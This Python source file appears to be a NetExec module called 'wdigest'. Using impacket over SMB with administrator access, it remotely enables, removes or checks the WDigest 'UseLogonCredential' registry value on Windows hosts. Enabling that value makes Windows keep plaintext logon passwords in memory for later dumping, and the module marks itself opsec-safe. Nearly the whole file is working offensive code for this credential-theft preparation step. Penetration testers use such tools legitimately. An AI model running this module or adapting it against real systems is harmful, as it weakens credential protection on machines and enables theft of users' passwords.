from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5 import rrp
from impacket.examples.secretsdump import RemoteOperations
from sys import exit
import contextlib


class NXCModule:
    name = "wdigest"
    description = "Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        """ACTION  Create/Delete the registry key (choices: enable, disable, check)"""
        if "ACTION" not in module_options:
            context.log.fail("ACTION option not specified!")
            exit(1)

        if module_options["ACTION"].lower() not in ["enable", "disable", "check"]:
            context.log.fail("Invalid value for ACTION option!")
            exit(1)

        self.action = module_options["ACTION"].lower()

    def on_admin_login(self, context, connection):
        if self.action == "enable":
            self.wdigest_enable(context, connection.conn)
        elif self.action == "disable":
            self.wdigest_disable(context, connection.conn)
        elif self.action == "check":
            self.wdigest_check(context, connection.conn)

    def wdigest_enable(self, context, smbconnection):
        remote_ops = RemoteOperations(smbconnection, False)
        remote_ops.enableRegistry()

        if remote_ops._RemoteOperations__rrp:
            ans = rrp.hOpenLocalMachine(remote_ops._RemoteOperations__rrp)
            reg_handle = ans["phKey"]

            ans = rrp.hBaseRegOpenKey(
                remote_ops._RemoteOperations__rrp,
                reg_handle,
                "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest",
            )
            key_handle = ans["phkResult"]

            rrp.hBaseRegSetValue(
                remote_ops._RemoteOperations__rrp,
                key_handle,
                "UseLogonCredential\x00",
                rrp.REG_DWORD,
                1,
            )

            rtype, data = rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, key_handle, "UseLogonCredential\x00")

            if int(data) == 1:
                context.log.success("UseLogonCredential registry key created successfully")

        with contextlib.suppress(Exception):
            remote_ops.finish()

    def wdigest_disable(self, context, smbconnection):
        remote_ops = RemoteOperations(smbconnection, False)
        remote_ops.enableRegistry()

        if remote_ops._RemoteOperations__rrp:
            ans = rrp.hOpenLocalMachine(remote_ops._RemoteOperations__rrp)
            reg_handle = ans["phKey"]

            ans = rrp.hBaseRegOpenKey(
                remote_ops._RemoteOperations__rrp,
                reg_handle,
                "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest",
            )
            keyHandle = ans["phkResult"]

            try:
                rrp.hBaseRegDeleteValue(
                    remote_ops._RemoteOperations__rrp,
                    keyHandle,
                    "UseLogonCredential\x00",
                )
            except Exception:
                context.log.success("UseLogonCredential registry key not present")

                with contextlib.suppress(Exception):
                    remote_ops.finish()

                return

            try:
                # Check to make sure the reg key is actually deleted
                rtype, data = rrp.hBaseRegQueryValue(
                    remote_ops._RemoteOperations__rrp,
                    keyHandle,
                    "UseLogonCredential\x00",
                )
            except DCERPCException:
                context.log.success("UseLogonCredential registry key deleted successfully")

                with contextlib.suppress(Exception):
                    remote_ops.finish()

    def wdigest_check(self, context, smbconnection):
        remote_ops = RemoteOperations(smbconnection, False)
        remote_ops.enableRegistry()

        if remote_ops._RemoteOperations__rrp:
            ans = rrp.hOpenLocalMachine(remote_ops._RemoteOperations__rrp)
            reg_handle = ans["phKey"]

            ans = rrp.hBaseRegOpenKey(remote_ops._RemoteOperations__rrp, reg_handle, "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest")
            key_handle = ans["phkResult"]

            try:
                rtype, data = rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, key_handle, "UseLogonCredential\x00")
                if int(data) == 1:
                    context.log.success("UseLogonCredential registry key is enabled")
                else:
                    context.log.fail(f"Unexpected registry value for UseLogonCredential: {data}")
            except DCERPCException as d:
                if "winreg.HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest" in str(d):
                    context.log.fail("UseLogonCredential registry key is disabled (registry key not found)")
                else:
                    context.log.fail("UseLogonCredential registry key not present")
            with contextlib.suppress(Exception):
                remote_ops.finish()
